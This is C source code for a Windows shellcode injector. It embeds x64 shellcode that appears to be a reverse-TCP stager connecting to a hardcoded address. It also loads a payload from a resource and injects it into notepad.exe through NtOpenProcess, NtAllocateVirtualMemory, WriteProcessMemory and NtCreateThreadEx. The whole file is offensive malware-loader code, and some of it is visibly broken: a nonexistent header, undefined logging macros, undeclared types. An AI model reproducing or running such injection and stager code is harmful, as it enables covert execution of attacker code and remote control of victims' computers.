#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <handBag.h>
#include <psapi.h>
#include <wtsapi32.h>
#include "resource.h"
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Wtsapi32.lib")

#include <Windows.h>
#include <stdio.h>

#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")

LPVOID payload = NULL;
const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;

    hModule = GetModuleHandleW(modName);
    if (hModule == NULL) {
    }
    else {
        return hModule;
    }
}

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char shellcode[] =

"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x51\x56\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01"
"\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x26\x48\x89\x4a\x83\x13\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";


//SIZE_T payload_len = sizeof(shellcode);


int FindTarget(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count))
        return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }
    return pid;
}


int main(int argc, char* argv[]) {

    HRSRC		hRsrc = NULL;
    HGLOBAL		hGlobal = NULL;
    PVOID		payload = NULL;
    SIZE_T		payload_len = NULL;



    hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hRsrc == NULL) {
        // in case of function failure 
        printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        // in case of function failure 
        printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Get the address of our payload in .rsrc section
    payload = (char *) LockResource(hGlobal);
    if (payload == NULL) {
        // in case of function failure 
        printf("[!] LockResource Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Get the size of our payload in .rsrc section
    payload_len = SizeofResource(NULL, hRsrc);
    if (payload_len == NULL) {
        // in case of function failure 
        printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Printing pointer and size to the screen
    printf("[i] payload var : 0x%p \n", payload);
    printf("[i] payload_len var : %ld \n", payload_len);




    info("The memory address of the shellcode is: 0x%p", shellcode);

    NTSTATUS STATUS;
    DWORD dwPID = NULL;
    HANDLE hProc = NULL;
    HMODULE hNTDLL = NULL;
    HANDLE hThread = NULL;
    SIZE_T BytesWritten = 0;
    DWORD OldProtection = 0;

    dwPID = FindTarget("notepad.exe");
    hNTDLL = getMod(L"NTDLL");
    OBJECT_ATTRIBUTES OA = { sizeof(OA),NULL };
    CLIENT_ID CID = { (HANDLE)(dwPID), NULL};

    /* FUNCTION PROTOTYPES */

    NtOpenProcess rovOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx rovThreadEx= (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtAllocateVirtualMemoryEx rovVirtualAlloc= (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory rovProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
    NtWriteVirtualMemory rovWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");

    /* BEGIN THE INJECTION */

    STATUS = rovOpen(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("NTOpenProcess, Failed to open process, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    STATUS = rovVirtualAlloc(hProc, &payload, 0, &payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtAllocateVirtualMemoryEx, Failed to allocate memory, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    STATUS = rovProtectVirtualMemory(hProc, &payload, &payload_len, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != STATUS) {
        warn("NtProtectVirtualMemory, Failed to change memory address, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    okay("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", payload);


    // Allocating memory using a HeapAlloc call
    PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, payload_len);
    if (pTmpBuffer != NULL) {
        // copying the payload from resource section to the new buffer 
        memcpy(pTmpBuffer, payload, payload_len);
    }

    // Printing the base address of our buffer (pTmpBuffer)
    printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);



    if (!WriteProcessMemory(hProc, payload, (PVOID)pTmpBuffer, (SIZE_T)payload_len, NULL)) {
        return EXIT_FAILURE;
    }
    STATUS = rovThreadEx(&hThread, PROCESS_ALL_ACCESS, &OA, hProc, payload, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[-] NTCreateThreadEx, Failed to open process, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    okay("Thread has been created! Waiting for thread to finish execution");

    WaitForSingleObject(hThread, INFINITE);
    okay("Execution complete! Awaiting Cleanup!");
    CloseHandle(hThread);

return 0;
}
